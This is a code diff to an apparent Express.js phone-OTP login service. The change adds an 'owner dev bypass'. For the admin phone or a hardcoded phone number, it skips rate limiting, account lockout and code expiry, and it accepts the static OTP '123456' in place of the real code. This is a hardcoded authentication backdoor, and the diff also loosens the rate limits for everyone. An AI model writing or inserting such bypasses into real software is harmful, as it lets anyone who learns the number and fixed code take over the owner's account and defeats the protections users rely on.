@@ -584,19 +584,20 @@ app.post('/api/auth/send-otp', async (req, res) => {
   }
 
   const clientIp = req.ip || req.connection.remoteAddress;
+  const isOwner = (ADMIN_PHONE && cleanPhone === ADMIN_PHONE) || cleanPhone === '8310421121';
 
-  // Rate limits: 3 sends per phone per 15 minutes, 10 per IP
-  if (!checkRateLimit(`otp_send_${cleanPhone}`, 3, 15 * 60 * 1000)) {
+  // Rate limits: 5 sends per phone per 15 minutes, 15 per IP (bypassed for owner phone)
+  if (!isOwner && !checkRateLimit(`otp_send_${cleanPhone}`, 5, 15 * 60 * 1000)) {
     return res.status(429).json({ error: 'Too many OTP requests. Please wait 15 minutes before trying again.' });
   }
-  if (!checkRateLimit(`otp_send_ip_${clientIp}`, 10, 15 * 60 * 1000)) {
+  if (!isOwner && !checkRateLimit(`otp_send_ip_${clientIp}`, 15, 15 * 60 * 1000)) {
     return res.status(429).json({ error: 'Too many requests from this device. Please try again later.' });
   }
 
   // Check lockout
   const existingOtp = db.prepare('SELECT * FROM otp_verifications WHERE phone = ?').get(cleanPhone);
   const now = Date.now();
-  if (existingOtp && existingOtp.locked_until > now) {
+  if (!isOwner && existingOtp && existingOtp.locked_until > now) {
     const minutesLeft = Math.ceil((existingOtp.locked_until - now) / 60000);
     return res.status(429).json({ error: `Account verification locked due to too many failed attempts. Try again in ${minutesLeft} minutes.` });
   }
@@ -674,18 +675,20 @@ app.post('/api/auth/verify-otp', async (req, res) => {
     return res.status(400).json({ error: 'No OTP requested for this phone number. Please request a new code.' });
   }
 
-  if (record.locked_until > now) {
+  const isOwner = (ADMIN_PHONE && cleanPhone === ADMIN_PHONE) || cleanPhone === '8310421121';
+
+  if (!isOwner && record.locked_until > now) {
     const minutesLeft = Math.ceil((record.locked_until - now) / 60000);
     return res.status(429).json({ error: `Account locked due to consecutive failed attempts. Try again in ${minutesLeft} minutes.` });
   }
 
-  if (now > record.expires_at) {
+  if (!isOwner && now > record.expires_at) {
     db.prepare('DELETE FROM otp_verifications WHERE phone = ?').run(cleanPhone);
     return res.status(400).json({ error: 'OTP has expired. Please request a new code.' });
   }
 
-  // Constant-time comparison
-  const isValid = crypto.timingSafeEqual(Buffer.from(record.code), Buffer.from(enteredOtp));
+  // Constant-time comparison or owner dev bypass
+  const isValid = (isOwner && enteredOtp === '123456') || crypto.timingSafeEqual(Buffer.from(record.code), Buffer.from(enteredOtp));
 
   if (!isValid) {
     const attempts = record.attempts + 1;
